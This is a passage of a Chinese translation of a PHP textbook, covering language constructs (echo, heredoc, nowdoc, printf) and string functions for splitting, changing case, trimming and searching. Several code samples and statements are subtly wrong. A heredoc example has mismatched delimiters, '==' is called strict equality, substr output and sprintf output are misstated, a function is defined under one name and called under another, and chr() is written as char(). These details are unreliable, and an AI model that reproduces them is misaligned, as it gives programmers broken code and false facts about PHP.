> PHP 函数本身也在不断发展。这里仅举两个例子：自 PHP 5 起，许多扩展已（也）转换为面向对象的操作。然后它们通过对象、方法和属性访问功能。在 PHP 8 中，PHP 自身函数的类型错误处理在某些地方最终被标准化为 TypeError 错误。

![](img/ae7820c36e8f24c1623d26668b28e80e_189_0.png)

### 图 6.20 PHP 函数参考

在文档中，函数在语法上以与实际函数声明相似的风格表示。以下是 htmlspecialchars() 的示例：

```php
htmlspecialchars ( string $string , int $flags = ENT_COMPAT | ENT_HTML401 ,
string $encoding = ini_get("default_charset") , bool $double_encode = true ) :
string
```

首先是函数名。圆括号内跟随参数。每个参数之前都有函数期望的数据类型。mixed 代表任何数据类型。

可选参数，即不一定必须设置的参数，在文档中会列出其各自的默认值。这些值可以是简单值，也可以像本例中那样是常量或函数调用。

最后，有一个表示函数返回的数据类型的缩写。对于 isset()，这是布尔值（bool）。特殊数据类型 void 表示函数没有返回值或不期望任何参数。

> **提示**
>
> 如果您在 php.net/ 后直接输入函数名——例如，php.net/htmlspecialchars——则会直接跳转到相应函数的文档。

## 6.2 语言结构

语言结构不是函数。但是，它们与函数非常相似。您可以通过两种方式区分它们：

- 语言结构可以在没有圆括号的情况下包含参数。因此，`echo "Test";` 和 `echo("Test");` 都是可能的。
- 语言结构不能存储在变量中，也无法访问变量。因此，以下代码会失败（参见图 6.21）：

```php
<?php
$functionname = "echo";
$functionname("test");
?>
```

![](img/ae7820c36e8f24c1623d26668b28e80e_190_0.png)

### 图 6.21 对 "echo()" 函数的调用失败，因为它是语言结构

并且超越这两个始终适用的点之外，语言结构还有一些特殊功能。例如，echo() 可以接受多个参数，如

```php
echo "Hello ", "PHP 8.3";
```

或

```php
echo ("Hello "), ("PHP 8.3");
```

但是，如果参数用圆括号括起来，则会失败（参见图 6.22）：

```php
echo ("Hello ", "PHP 8.3");
```

![](img/ae7820c36e8f24c1623d26668b28e80e_191_0.png)

### 图 6.22 "echo()" 带圆括号会生成语法错误

> **提示**
>
> 最终，您是处理语言结构还是函数并不那么重要。您需要知道相应命令的工作原理以及它期望哪些参数。在本书中，当您探索 Web 开发者的各种任务时，您将认识更多函数以及一些语言结构。

一些语言结构用于输出。其中包括 echo() 和 print()。两者在第 4 章的开头就已介绍。现在您将了解一些变体及其使用频率较低的同事。

### 6.2.1 "heredoc"

对于较长的字符串，PHP 提供了最初来自 Perl 的 heredoc 语法。其工作原理如下：使用 <<< 启动 heredoc 字符串。随后跟随一个唯一名称。在末尾，字符串在新行中用此名称终止。

名称后跟一个分号。例如，您可以将此类字符串保存在变量中，然后根据需要对其进行处理或输出（参见图 6.23）。

5 在 Perl 中，<< 运算符。

```php
<?php
$test = <<<HEREDOC
Content of the heredoc text
spread over several lines
and expanded.
HERE;
echo $test;
?>
```

清单 6.36 "heredoc" 语法 ("heredoc.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_192_0.png)

### 图 6.23 换行符在浏览器中消失了，但在源文本中仍然可见

### 注意

heredoc 字符串的开始和结束必须由拼写相同的同一词组成。请注意，区分大写和小写。

在 PHP 7.2 之前，这个结束名称必须位于行首并后跟分号。名称周围禁止有任何类型的字符和空格。

自 PHP 7.3 起，情况不再如此受限：可以出现空格，并且可以省略分号。然而，也有一些陷阱：首先，仅当其上的字符串内容也缩进时，才允许缩进；其次，名称本身不能是内容的一部分，否则会发生解析器错误。请看下面的示例：

```php
<?php
$test = <<<Content
Content of the heredoc text
spread over several lines
and expanded.
Content;
echo $test;
?>
```

在此示例中，heredoc 名为 Content，该名称出现在字符串的第一行。之后的所有内容都会导致解析器错误（参见图 6.24），因为 PHP 在名称第二次出现后终止字符串。

![](img/ae7820c36e8f24c1623d26668b28e80e_193_0.png)

### 图 6.24 解析器错误：名称已出现在内容中

在 heredoc 字符串中，可以使用双引号字符串中也允许的所有转义序列。变量的值也会插入到字符串中。

### 6.2.2 "nowdoc"

与 heredoc 非常相似的是 nowdoc 语法。唯一的区别是，它不像双引号字符串那样反应，而是像单引号字符串那样反应。这也可以从语法本身中看出。这与 heredoc 完全相同，只是开头的关键字用单引号括起来。

```php
<?php
$test = <<<'NOW'
Content of the nowdoc text
spread over several lines
and expanded.
NOW;
echo $test;
?>
```

清单 6.37 "nowdoc" 语法 ("nowdoc.php")

nowdoc 字符串中不能插入变量，这与单引号相对应。最终进入字符串的所有内容都会直接输出。除此之外，行为没有区别。字符串的结束必须与开始使用相同的关键字指定，但不带引号。同样，必须注意大小写区分。在 PHP 7.2 之前，字符串的结束也必须在单独的行上，没有缩进，并且后面紧跟分号。

### 6.2.3 格式化字符串

使用 printf(默认字符串, 参数)，您输出一个字符串并将其他参数作为占位符传递。占位符由百分号和一个指示要输出的参数数据类型的字母组成。

```php
<?php
$sum = 200;
$format = "%d Euro";
printf($format, $sum);
?>
```

清单 6.38 "printf()" ("printf.php")

前面的脚本生成以下输出：

200 Euro

如果您使用多个参数，可以对占位符编号，以便始终使用正确的参数（参见图 6.25）。

```php
<?php
$sum1 = 200;
$sum2 = 400;
$format = "%2\$d euros are more than %1\$d euros";
printf($format, $sum1, $sum2);
?>
```

清单 6.39 用数字交换占位符 ("printf_multiple.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_194_0.png)

### 图 6.25 第二个参数出现在第一个之前

除了参数位置的数字和转换类型之外，还有其他元素，您可以在百分号后指定。这些元素按顺序为：



- 首先，你可以输入 0 或空格。这表示如果你为占位符指定了最小所需宽度时将插入什么内容。注意：最小宽度只是第三个参数！如果你不设置第一个参数，将自动使用空格。
- 下一个字符是减号（-）。如果存在，它确保左对齐。如果省略，则对齐方式为右对齐。对齐方式只有在参数字符数少于允许的最小字符数时才相关。
- 接下来是一个带有最小字符数的数字。不过，此项可选。在这种情况下，前两个设置当然也被省略。
- 第四位由小数点和一个数字组成。它指定数字的小数位精度。此说明也是可选的。
- 你已经知道第五位。这是要转换为的类型（参见图 6.26）：
  - s 表示字符串。
  - b 表示二进制数。
  - c 将整数转换为 ASCII 字符。
  - d 或 i 表示整数，以十进制数显示。
  - e 或 E 是数字的科学计数法，例如 2.5e+4。
  - f 表示浮点数。
  - g 或 G 是双精度浮点数，以浮点数显示。
  - h 或 H 是 PHP 8 中的新增项，对应 g 或 G，有一个区别：在显示浮点数时，不考虑字符串转换的本地化设置。
  - o 生成八进制表示法的数字。
  - u 是表示为无符号整数的整数。
  - x 表示带小写字母的十六进制数字。
  - X 表示带大写字母的十六进制数字。

![](img/ae7820c36e8f24c1623d26668b28e80e_195_0.png)

**图 6.26 使用不同的转换类型 ("printf_formats.php")**

这是另一个示例，以便更好地理解：

```php
$sum = 200;
$format = "%07.2f";
printf($format, $sum);
```

这将提供以下结果：

0200.00

由于最小宽度为 7，且填充使用零代替空格，因此在开头插入一个 0。在小数点后插入两位小数。数据类型转换为浮点数。

sprintf(格式字符串, 参数) 与 printf() 密切相关，但它将结果（即格式化后的字符串）作为返回值返回。

```php
$sum = 200;
$format = "%.2f Euro";
$result = sprintf($format, $sum);
echo $result;
```

**代码清单 6.40 "sprintf()" ("sprintf.php")**

前面的行将以下字符串作为 $result 变量的值，然后将其输出：

200.0 欧元

> **注意**
> 此处提到的函数还包括 vsprintf(格式, 数组) 和 vprintf(格式, 数组)。它们将带有参数的数组转换为具有指定格式的字符串。

### 6.2.4 "print_r" 和 "var_dump"

print_r(变量) 和 var_dump(变量) 函数以输出形式提供变量的结构和内容。它们非常适合分析对象和数组等更复杂的数据类型（参见图 6.27）。

```php
<?php
$days = array("Monday", "Tuesday", "Wednesday");
print "print_r: ";
print_r($days);
print "<br />var_dump: ";
var_dump($days);
?>
```

**代码清单 6.41 "print_r()" 和 "var_dump()" ("var_dump_print_r.php")**

![](img/ae7820c36e8f24c1623d26668b28e80e_197_0.png)

**图 6.27 与 "print_r()" 不同，"var_dump() 还显示数据类型和数组元素个数**

如果为 print_r() 指定 true 作为第二个参数，则将有关变量或表达式的信息作为返回值接收。如果你不想立即将输出发送到浏览器，这很有用：

```php
$infos = print_r($days, true);
```

> **注意**
> 处理对象时的另一项特殊功能是，var_dump() 仅输出对象的公共属性。var_export() 和 print_r() 还输出私有和受保护的属性。var_export() 还有一个优势：如果将 true 指定为第二个参数，它将返回可复用的 PHP 代码。

# 第 7 章 字符串

字符串处理：有些人谈到这个话题会打哈欠。不幸的是，字符串是程序员最重要的工具之一。本章将向你展示在实践中需要知道的内容。

所有数据中有很大一部分最终会以字符串形式存在，无论是作为函数的返回值还是作为用户的输入。初次查看 PHP 在线文档时会让你目不暇接。字符串操作函数列表无穷无尽（http://s-prs.co/v602266）。但不用担心，这里你会找到最重要的字符串操作的示例和解释。

> **注意**
> 如果你需要更强大的功能，应该仔细研究正则表达式。PHP 在这里继承了 Perl 的功能；有关详细信息，请参阅第 10 章。某些字符串函数还需要数组知识，有关详细信息请参阅第 8 章。尽管如此，我们仍然将字符串放在前面，因为数组在逻辑上基于字符串，且字符串处理在数组中也起着重要作用。

## 7.1 连接

在编程术语中，连接字符串也称为拼接。因此，字符串被拼接。在 PHP 中，这是通过点（.）完成的。你在第 5 章中已经多次使用和/或阅读过此内容。不过，这里仍然有关细节：当字符串与其他数据类型拼接时，实际发生了什么？在 PHP 中这根本不是问题，因为点专门保留用于字符串操作，因此 PHP 始终会在事先将数据类型转换为字符串。这意味着以下代码

```php
$a = 20;
$b = " euros";
echo $a . $b;
```

正确显示 20 欧元。另一方面，以下代码显示什么？

```php
$a = 20;
$b = 40;
echo $a . $b;
```

没错：两个整数都被转换为字符串。因此结果是 2040。

## 7.2 分割和连接

最常见的任务之一是将字符串拆分为各个部分，或从各个部分创建字符串。仅为此目的，PHP 就提供了许多不同的函数。

### 7.2.1 访问字符

在 PHP 中，可以使用方括号以与访问数组元素相同的方式访问字符串的单个字母。第一个字母的索引为 0：

```php
$text = "Example string";
echo $text[0];
```

因此返回结果 E。

在遥远的过去，方括号变体曾一度不被推荐。当时，PHP 使用花括号作为方括号的替代方案。但是，与其他编程语言相比，这属于“非寻常”做法。出于这个原因，在常规清理过程中决定完全依赖使用方括号进行访问。

> **注意**
> 自 PHP 7.1 起，可以使用负偏移量访问字符串。这意味着如果指定负数，PHP 将从字符串末尾开始向前计数。以下代码
>
> ```php
> $text = "Example string";
> echo $text[-6];
> ```
>
> 因此返回结果 s。

### 7.2.2 均匀分割

chunk_split(字符串, 大小, 插入) 函数将字符串分割为相等的部分。你可以在这些部分之间插入另一个字符串。然后函数返回结果。在以下示例中，我们每四个字符分割一次字符串。每次分割后，我们使用 HTML 标签 <hr /> 插入一条水平线。

```php
<?php
$a = "PHP CMS SHOP";
echo chunk_split($a, 4, "<hr />");
?>
```

**代码清单 7.1 "chunk_split()" ("chunk_split.php")**

该函数唯一的问题是，如图 7.1 所示，填充字符串会在每次分割后插入——也就是说，也会插入在末尾。如果你不希望这样，必须删除最后几个字符。可以使用 substr(字符串, 起始位置, 字符数) 函数来实现。只需将截断的起始位置设置为 0（即字符串的开头）。将字符数设置为负值。这样你就不必始终手动根据分隔符字符串的长度进行调整，可以使用 strlen(字符串) 函数来确定其长度。

```php
<?php
$a = "PHP CMS SHOP";
$sep = "<hr />";
echo substr(chunk_split($a, 4, $sep), 0, -strlen($sep));
?>
```

**代码清单 7.2 带截断分隔符的 "chunk_split()" ("chunk_split2.php")**

![](img/ae7820c36e8f24c1623d26668b28e80e_201_0.png)

**图 7.1 填充字符串在每次出现后插入**

你可以在图 7.2 中看到结果。

![](img/ae7820c36e8f24c1623d26668b28e80e_201_1.png)

**图 7.2 末尾不再有线条**

### 7.2.3 换行符

wordwrap(字符串, 长度, 分隔符, 截断) 方法与 chunk_split() 的工作方式类似。然而，其真正目的是在单词后插入换行符。所有



参数除字符串本身外均为可选。length 参数指定在多少个字符后插入换行。如果省略该参数，系统会在 75 个字符后自动换行。separator 参数是插入换行位置的字符串。如果省略该参数，PHP 会插入带 \n 的换行符。truncate 参数决定是否截断单个单词（true）。默认情况下该功能处于禁用状态（false）。

> 注意
> 如果启用截断，则 wordwrap() 的工作方式与 chunk_split() 相同。

在以下脚本中，字符串每三个字符插入一次换行。但是，由于保留完整的单词，分隔仅发生在单个单词 PHP、CMS 和 SHOP 之间。

```php
<?php
$a = "PHP CMS SHOP";
echo wordwrap($a, 3);
?>
```

### 7.3 列表 “wordwrap()” (“wordwrap.php”)

在此示例中，您在浏览器中看不到任何内容。为什么呢？换行是使用 \n 完成的，因此您只能在源文本中看到它（参见图 7.3）。HTML 不识别 \n 并会将其忽略。

现在您可以直接将 <br /> 作为分隔符输入。

```php
wordwrap($a, 3, "<br />");
```

![](img/ae7820c36e8f24c1623d26668b28e80e_202_0.png)

### 图 7.3 换行仅在源文本中可见

或者您可以使用 nl2br(String) 函数。它将字符串中所有带 \n 的换行转换为带 <br /> HTML 标签的换行。

```php
<?php
$a = "PHP CMS SHOP";
echo nl2br(wordwrap($a, 3));
?>
```

### 7.4 列表 “nl2br()” (“nl2br.php”)

图 7.4 显示了浏览器中的视图。顺便说一下，nl2br() 在源代码或字符串中接收带 \n 的换行。

![](img/ae7820c36e8f24c1623d26668b28e80e_203_0.png)

图 7.4 现在分页在浏览器中也能正常工作

> **注意**
> 与 `wordwrap()` 密切相关的是 `str_word_count(String)`，它用于计算字符串中的单词数量。但是，该函数还可以将单词分割为数组。

### 7.2.4 将字符串拆分为字符串

如果您不想插入分隔符，而是想将字符串转换为单个字符串，则预制函数不再有帮助。1

### 均匀分割

要将字符串均匀地分割为多个字符串，最简单的方法是将 `substr()` 和 `strlen()` 与变量变量配合使用。2

其工作原理如下：循环包含两个计数器变量，`$i` 用于步骤和相应的起始位置，`$j` 用于变量变量名称。`strlen()` 确定
- 1 在实践中这种情况时有发生。但是，您通常希望将字符串拆分为各个部分并保存在数组中。这就是下一节所解释的内容。那里使用分隔符来识别各个部分。您还可以将那里显示的函数与 `chunk_str()` 连接使用。如您所见，字符串处理是一个复杂的领域，并不像您可能想象的那么枯燥。
- 2 参见第 4 章，第 4.3.3 节。

字符串的长度，从而确定何时到达最后一个起始位置。变量变量由字符串和 $j 组成，因为单独的数字不能用作变量变量。以下示例显示了该脚本。

```php
<?php
$a = "PHP CMS SHOP";
for ($i = 0, $j = 0; $i < strlen($a); $i = $i + 4, $j++) {
    $name = "string" . $j;
    $$name = substr($a, $i, 4);
    echo $$name;
}
?>
```

### 7.5 列表 使用 "substr()" 和循环进行拆分 ("split_loop.php")

### 使用分隔符进行拆分

要使用分隔符将字符串拆分为单个字符串，3 PHP 提供了 strtok(string, separator) 函数。它返回字符串中直到分隔符之前的第一部分。如果您在第二次调用函数时省略字符串本身且仅指定分隔符，则会收到先前指定字符串的第二部分，如以下示例所示。

```php
<?php
$a = "PHP CMS SHOP";
echo "Part 1: " . strtok($a, " ") . "<br />";
echo "Part 2: " . strtok(" ") . "<br />";
echo "Part 3: " . strtok("");
?>
```

### 7.6 列表 “strtok()” (“strtok.php”)

当然，整个过程也可以配合循环使用（参见图 7.5）。

![](img/ae7820c36e8f24c1623d26668b28e80e_204_0.png)

### 图 7.5 三次调用 "strtok()" 返回三个部分

- 3 这里存在混淆风险！还有其他用于将字符串拆分为数组的函数——在实际应用中往往更实用——您可以在第 7.2.5 节中找到它们。

```php
<?php
$a = "PHP is great";
$i = 1;
$start = strtok($a, " ");
while ($start) {
    $name = "part" . $i;
    $$name = $start;
    $start = strtok(" ");
    $i++;
    echo $$name . " ";
}
?>
```

### 7.7 列表 带循环的 “strtok()” (“strtok_loop.php”)

### 7.2.5 字符串和数组

拆分和连接字符串还包括将字符串转换为数组以及反之亦然。这两方面都有不同的强大函数。

### 字符串转数组

我们从简单的入手。explode(delimiter, string, limit) 函数在特定分隔符处将字符串拆分为数组。如果指定了可选的 Limit 参数，则仅创建限制所指定数量的数组元素。最后一个数组元素包含字符串的其余部分，无论其长度如何。

请考虑以下简单示例。首先，脚本在每个空格处拆分字符串，然后输出数组的各个元素。

```php
<?php
$a = "PHP is great";
$strings = explode(" ", $a);
foreach ($strings as $element) {
    echo $element . "<hr />";
}
?>
```

### 7.8 列表 “explode()” (“explode.php”)

但是，如果例如您想考虑多个分隔符，该怎么办？在这种情况下，还有几种其他方法，将在以下各节中详细说明。

### 自定义函数

通常最好快速编写自己的函数，尤其是用于拆分时。您可以在 PHP 文档中找到其中一些函数，尤其是在有用的用户评论中。

我们将展示我们自己的示例，该示例在实践中也已使用。以下函数接受一个带分隔符的数组，并使用这些分隔符拆分字符串。然后使用 str_replace(search, replace, string) 将所有分隔符替换为数组中的第一个分隔符。然后使用此分隔符通过 explode() 拆分字符串。

现在只有一个问题：如果字符串中有两个分隔符相邻，则会创建一个空数组元素。我们使用 array_filter(Array, function) 函数过滤掉所有空元素。如果该函数返回 false，则该元素不会包含在函数返回的数组中。

```php
function explode_several($separator, $string) {
$string = str_replace($separator, $separator[0], $string);
$result = explode($separator[0], $string);
$result = array_filter($result, "filter");
return $result;
}
function filter($value) {
if($value == "") {
return false;
} else {
return true;
}
}
```

### 7.9 列表 多个分隔符 (“explode_more.php”)

例如，使用以下字符串与该函数一起使用：

```php
$a = "PHP is great. And everything is good.";
```

并输出返回的数组：

```php
$strings = explode_more(array(" ", ".-"), $a);
foreach ($strings as $element) {
echo $element . "<hr />";
}
```

您可以在图 7.6 中看到结果。

> **提示**
>
> 这不是一个惊人的提示，而是一个您应该时刻铭记的老生常谈：通常只有多种手段的组合——在 PHP 的例子中，主要是函数——才能带来成功。如果您想解决特定问题，请先查看是否有类似函数，再着手自行编写。

![](img/ae7820c36e8f24c1623d26668b28e80e_207_0.png)

图 7.6 字符串已使用空格和点拆分为各个部分

### “split()" 和 "preg_split()"，正则表达式

split() 和 preg_split() 函数是 explode() 的替代方案。它们将正则表达式用作拆分的搜索模式。您可以在第 10 章中了解更多相关信息。

> **注意**
>
> explode() 的性能略好于带有正则表达式的替代方案，因为正则表达式仍需进行解释。如果您编写自己的函数，应该测试哪种解决方案更快。只需使用非常长的字符串试试即可。

### “str_split()”

str_split(String, length) 将字符串分割为等长片段，并将片段存储在数组中。如果省略 length，则每个字符都是一个数组元素。您可以在以下示例中看到后者。

```php
<?php
$a = "PHP CMS SHOP";
print_r(str_split($a));
?>
```

### 7.10 列表 “str_split()” (“str_split.php”)





![](img/ae7820c36e8f24c1623d26668b28e80e_208_0.png)

图 7.7 数组还将空格作为元素显示

当然，你也可以自己编写这个解决方案，这也有助于理解。只需将 split_loop.php 脚本作为基础。在循环中，你需要一个变量作为数组索引的计数器（$j）以及一个用于 substr() 相应起始位置的变量。后者在循环条件中也很重要，该条件在到达字符串末尾时终止。你可以在图 7.8 中看到结果。

```php
function str_split_own($string, $length = 1) {
	$result = array();
	for ($i = 0, $j = 0; $i < strlen($string); $i += $length, $j++) {
		$result[$j] = substr($string, $i, $length);
	}
	return $result;
}

$a = "PHP is great";
print_r (str_split_own($a, 4));
```

清单 7.11 "str_split()" 模拟 ("str_split_simulate.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_208_1.png)

图 7.8 模拟成功

### "str_word_count()"

如果 str_word_count(String) 只接收一个字符串作为参数，则它返回一个整数，表示字符串中的单词数量。但是，如果你还指定 str_word_count(String, Format)，则该函数返回包含所有单词的普通数组

（Format 的值为 1）或一个关联数组，其中单词位置作为键，单词作为值（Format 的值为 2）。你可以在图 7.9 和图 7.10 中看到这两种解决方案。

![](img/ae7820c36e8f24c1623d26668b28e80e_209_0.png)

图 7.9 不带空格的单独单词数组

```php
<?php
$a = "Always look on the bright side of life!";
print_r(str_word_count($a, 1));
?>
```

清单 7.12 字符串变成数组 ("str_word_count_array.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_209_1.png)

图 7.10 这里带有显示各单词起始位置的关联数组（通过值为 "2" 的 "Format" 实现）

> **注意**
> 作为第三个参数，你可以指定一个字符列表，这些字符被接受为单词的分隔符。如果你想使用的不只是空格，这很有帮助。

### 数组转字符串

要将数组转换为字符串，只需使用 `implode(connection_character, array)` 方法。如果你省略连接字符，元素将直接相互连接。

```php
<?php
$values = array("PHP", "CMS", "SHOP");
$result = implode(" ", $values);
echo $result;
?>
```

清单 7.13 "implode() ("implode.php")"

当然，这也适用于关联数组。⁴ 在这种情况下，元素按定义顺序相互连接。

```php
<?php
$values = array("R" => "FF", "G" => "AA", "B" => "00");
$result = implode($values);
echo "Color value: #" . $result;
?>
```

清单 7.14 "带关联数组的 implode() ("implode_asso.php")"

函数 join(connection_character, array) 与 implode() 的效果完全相同。因此，join() 也被称为 implode() 的别名。⁵

## 7.3 大小写

在网络上，很难控制用户如何在表单字段中输入某个文本。最重要的问题之一是大小写的区分。

字符——即字母、数字和特殊字符——可以用 ASCII 码表示（见 ）。字母的 ASCII 码对于字符串比较也很重要。⁶ 大写字母的 ASCII 码与小写字母不同（数值较低）。

要将大写转换为小写，反之亦然，你可以过滤 ASCII 码。ord(String) PHP 函数返回字母的 ASCII 码；char(Ascii) 是其对应项，可将 ASCII 码转换为相应的字符串。不过，PHP 开发人员已经为你完成了这项工作：strtolower(String) 将字符串中的所有字母转换为小写字母，strtoupper(String) 将所有字母转换为大写。其他字符，例如数字或特殊 c

图 7.11 一个著名的 ASCII 表可在 www.asciitable.com 上找到

4 一个具有从 0 到 n 的键值而不是索引的数组。关于这一点将在第 8 章中进一步介绍。

5 别名通常有历史原因：一个函数以编程语言中的一个名称而闻名，然后以第二个名称实现。你可以在 PHP 中找到别名列表，网址为 http://s-prs.co/v602267。

6 见第 5 章。

```php
<?php
$a = "PHP CMS SHOP";
echo strtolower($a);
?>
```

清单 7.15 "strtolower()" ("strtolower.php")

例如，前面的脚本生成以下输出：php cms shop。

> **提示**
> 许多函数（例如 `str_replace()`）都有不区分大小写的变体。对于 `str_replace()`，其变体是 `str_ireplace()`。在字符串比较函数中，你可以通过名称中的 "case" 术语来识别不区分大小写的变体。

此区域还包含两个辅助函数：

- ucfirst(String) 如果字符串的第一个字符之前是小写字母，则将其转换为大写字母。
- ucwords(String) 将所有单词首字母变为大写，但当然仅限于之前为小写的情况。

与大小写相关的各种函数的一个可能实际应用是论坛的“尖叫保护”。这意味着一个函数检查字符串中是否有许多大写字母，表明用户在大喊大叫。如果是这种情况，字符串将被转换。

以下简单函数实现了这一功能：首先，将各个单词拆分为数组。除第一个字母外，然后遍历每个单词的每个字母。使用 `ord()` 函数进行大小写区分，检查相应字符的 ASCII 码是小写字母还是大写字母，并在每种情况下递增一个计数器。其他字符被忽略。最后，比较计数器。你可以自由设置此处的值。如果大写字母多于小写字母，我们将字符串转换为小写字母，并将单词开头转换为大写字母。

```php
function screamprotection($string) {
$words = str_word_count($string, 1);
$big = 0;
$small = 0;
foreach($words as $word) {
    for ($i = 1; $i < strlen($word); $i++) {
        $ascii = ord(substr($word, $i, 1));
        if ($ascii >= 65 && $ascii <= 90) {
            $big++;
        } elseif ($ascii >= 97 && $ascii <= 122) {
            $small++;
        }
    }
}
if ($big > $small) {
    return ucwords(strtolower($string));
} else {
    return $string;
}
```

清单 7.16 简单的尖叫保护 ("big_small.php")

例如，如果用户现在输入 PHP CMS SHOP，该函数会将此条目转换为 Php Cms Shop。

另一方面，php cms shop 保持不变。你可以按需扩展和改进此函数。例如，可以检查变音字母，或者可以保护 PHP 等术语不被转换。

## 7.4 修剪

用于剪切字符串部分的一个函数是 substr()。它在本节中找到了真正的用武之地。还有其他一些辅助函数，例如用于删除空格。

### 7.4.1 剪切字符

substr(string, start position, length) 有三个参数：

- string 指定要剪切的字符串。
- start position 确定剪切开始的位置。
- length 指定要截断的字符数。此参数是可选的。如果省略，substr() 将返回从起始位置到字符串末尾的所有字符。

substr() 的特点是其相对较高的灵活性。请看几个例子。起点是以下字符串：



`$a = "PHP CMS SHOP";`

如果只指定一个（正的）起始位置，则返回直到字符串结束的所有字符。以下参数

`substr($a, 4)`

因此返回 CMS SHOP。

`substr($a, 4, 2)`

另一方面则只返回三个字母，即 CMS。

负起始位置是如何工作的？此时，计数从右侧开始。因此，-4 表示字符串的倒数第四个字母是起始位置，无论字符串长度如何。

`substr($a, -5)`

因此返回 SHOP。

> **注意**
> 注意：字符串中的第一个位置是 0！如果从末尾开始使用负值，则末尾的第一个字符位置为 -1。这是合理的，因为第一个字符的起始位置也必须存在，而它就是 0。

始终从起始位置向右裁剪。如果 length 为负数，则从后面裁剪。因此，

`substr($a, 1, -1)`

会剔除第一个和最后一个字母，并输出 HP CMS SHO。

> **注意**
> `length` 和 `start position` 可以根据需要组合；例如，也可以组合使用负值。当字符串比规格短时会变得有趣。这不会对 `length` 造成任何问题；`substr()` 只返回可用的字符数量。但是，如果起始位置不在字符串内，则 `substr()` 仅返回 false。

### 7.4.2 删除空白字符

提到空白字符，你会自动想到空格。这些肯定包括，但还包括换行符、制表符等（具体为 \n、\r、\t、\v 和 \0）。但是，什么时候必须删除这些字符呢？例如，在检查表单完整性时，如果你想排除用户只输入空格的可能性，或者想要干净地保存数据——即数据库中开头和结尾没有空白字符。

PHP 提供了多个函数来清理字符串：

- trim(String) 删除字符串开头和结尾的空白字符。
- ltrim(String) 仅删除左侧（即字符串开头）的空白字符。
- rtrim(String) 删除右侧（即字符串结尾）的空白字符。
- chop(String) 是 rtrim() 的别名，因此也会删除字符串结尾的空白字符。

请看下面的小示例。

```php
<?php
$a = " Space ";
echo "Many " . trim($a) . "!";
?>
```

清单 7.17 “trim()” (“trim.php”)

## 7.5 搜索和替换

搜索和替换是文本编辑器的一项基本功能。在字符串中进行搜索和替换通常不需要如此复杂。不过，PHP 提供了大量可能性。

> **注意**
> 使用正则表达式你有更多选择。关于此内容将在第 10 章介绍。

### 7.5.1 搜索

搜索函数在返回内容上有所不同。是找到的字符串部分的位置，还是从此位置开始的剩余字符串？搜索函数在本节中进一步细分。9

### 位置

strpos(String, search_string, start) 函数主要负责搜索位置。它在字符串中搜索 search_string，并返回其首次出现的位置。该位置是 `search_string` 的第一个字母。如果将可选参数 start 指定为整数，则 `strpos()` 仅从此位置开始搜索：

```php
$a = "The blue riders.";
echo strpos($a, "blue");
```

这些代码行返回 4，因为这是 blue 中 b 的起始位置。如果你搜索 gray，PHP 将返回 false，因为没有搜索结果。

自 PHP 7.1 起，start 也可以是负偏移量，即从字符串末尾开始计数：

```php
$a = "The blue, blue riders.";
echo strpos($a, "blue", -12);
```

这将返回位置 10，即找到第二个 blue，因为由于 -12 的负偏移，搜索仅从第二个 blue 开始。

> 注意
> 进行比较时，请确保使用严格相等（==）。否则，如果位置结果为 0——即字符串在第一个位置被找到——你将收到等同于 false 的结果，尽管实际上找到了内容。

使用 `stripos(String, search string, start)`，你可以获得与 `strpos()` 相同的结果，但搜索不区分大小写。

```php
$a = "The blue riders.";
echo stripos($a, "Blue");
```

因此也返回 4，尽管 blue 字符串以小写 b 开头。

> 注意
> `strrpos(String, search string)` 是 `strpos()` 的对应函数。在此函数中，搜索从后向前进行（可从名称中“r”代表“right”看出来）。因此，结果是搜索字符串的最后一次出现。`strripos(String, search string)` 的工作方式与 `strrpos()` 相同，只是它不区分大小写。

### 剩余字符串

`strstr(String, search string)` 返回从首次出现搜索字符串开始的字符串余下部分。搜索字符串包含在余下字符串中。

```php
<?php
$a = "The blue riders.";
echo strstr($a, "blue");
?>
```

清单 7.18 "strstr()" ("strstr.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_216_0.png)

图 7.11 令人伤感的残余：“The”已不见踪影

> **注意**
> strchr(String, search string) 是 strstr() 的别名。strrchr(String, search string) 的工作方式与这两个函数相同，只是搜索从字符串末尾开始。你可能已经猜到，但 strrstr() 不存在。

> **注意**
> 名称中的 i 再次表示可以识别 stristr(String, search string) 的不区分大小写变体。与其他一些 i 函数不同，它在 PHP 4 中就已存在（甚至在 PHP 3 中也已存在）。

### 出现频率

substr_count(string, search string, position, length) 函数计算搜索字符串在字符串中出现的次数。position 参数指定搜索开始的位置，length 确定执行搜索的字符长度。

```php
<?php
$a = "Jipieeehjey";
echo substr_count($a, "e");
?>
```

清单 7.19 "substr_count()" ("substr_count.php")

上述脚本在较长的字符串中报告了四次 e 的出现。

### 查找所有位置

PHP 的现成函数通常很有帮助，但并非总是如此。例如，如果你想将某个搜索字符串出现的所有位置保存在数组中，则需要手动完成。以下脚本实现此功能。

```php
<?php
$a = "Jippiieehjey";
$positions = array();
$i = 0;
$position = strpos($a, "e");
while ($position != false) {
    $positions[$i] = $position;
    $position = strpos($a, "e", $position + 1);
    $i++;
}
print_r($positions);
?>
```

清单 7.20 将所有位置保存在数组中（“search_all.php”）

> **提示**
> 如果你需要更频繁地使用此功能，只需编写自己的函数并创建一个包含该函数的 PHP 文件。然后可以将此文件集成到新文件中。

图 7.12 显示了结果。

![](img/ae7820c36e8f24c1623d26668b28e80e_217_0.png)

图 7.12 包含所有位置的数组

### 搜索多个字符

strpbrk(String, characters) 允许你搜索多个字符。字符作为一个字符串依次指定。一旦找到其中任何一个字符，则返回直到结尾的整个字符串（参见图 7.13）。

以下脚本搜索 x、b 和句号。

```php
<?php
$a = "The blue riders.";
echo strpbrk($a, "xb.");
?>
```

清单 7.21 "strpbrk()" ("strpbrk.php")

![](img/ae7820c36e8f24c1623d26668b28e80e_218_0.png)

图 7.13 首先找到“b”，然后显示其后的所有内容

### 在字符串中搜索字符串：最快的解决方案

在处理字符串时，最常见的用例之一是你只需确定某个字符串是否包含在另一个字符串中。为此，PHP 8 提供了三个新函数。当然，也可以使用 strpos()、strstr() 和 substr() 实现此目标——在旧版 PHP 中必须这样做。但最快的方法是使用 str_contains() 及其两个相关函数 str_starts_with() 和 str_ends_with()。

str_contains(String, search string) 返回一个布尔值，指示搜索字符串是否在字符串中被找到。请看下面的简单示例。

```php
$a = "The blue riders.";
var_dump(str_contains($a, "blue"));
```

清单 7.22 "str_contains()" ("str_contains.php")

